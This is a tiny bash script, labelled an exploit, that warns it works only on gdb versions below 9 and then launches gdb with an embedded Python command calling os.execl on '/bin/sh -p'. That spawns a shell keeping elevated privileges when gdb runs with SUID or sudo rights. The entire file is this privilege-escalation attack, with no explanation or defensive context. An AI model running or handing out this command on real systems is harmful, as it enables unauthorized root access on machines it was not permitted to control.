#!/bin/bash

echo -e "This exploit will work only if gdb version is below < 9.x"
sleep 2
gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit

